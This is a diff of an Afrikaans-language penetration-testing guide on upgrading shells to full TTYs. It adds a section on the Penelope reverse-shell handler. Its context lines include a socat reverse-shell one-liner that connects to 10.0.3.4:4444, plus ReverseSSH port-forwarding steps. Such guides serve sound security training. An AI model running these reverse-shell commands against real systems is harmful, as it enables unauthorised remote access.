@@ -69,7 +69,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 
 'n gerieflike manier vir **interaktiewe skulp toegang**, sowel as **lêer oordragte** en **poort forwarding**, is om die staties-gekoppelde ssh bediener [ReverseSSH](https://github.com/Fahrj/reverse-ssh) op die teiken te plaas.
 
-Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk na die [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
+Hieronder is 'n voorbeeld vir `x86` met upx-gecomprimeerde binêre. Vir ander binêre, kyk [releases page](https://github.com/Fahrj/reverse-ssh/releases/latest/).
 
 1. Berei plaaslik voor om die ssh poort forwarding versoek te vang:
 
@@ -112,6 +112,12 @@ ssh -p 8888 127.0.0.1
 # Bidirectional file transfer
 sftp -P 8888 127.0.0.1
 ```
+## Penelope
+
+Penelope (https://github.com/brightio/penelope) werk outomaties Linux reverse shells op na TTY, hanteer die terminalgrootte, log alles en nog baie meer. Dit bied ook readline-ondersteuning vir Windows shells.
+
+![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)
+
 ## Geen TTY
 
 As jy om een of ander rede nie 'n volle TTY kan verkry nie, kan jy **nog steeds met programme interaksie hê** wat gebruikersinvoer verwag. In die volgende voorbeeld word die wagwoord aan `sudo` gegee om 'n lêer te lees:
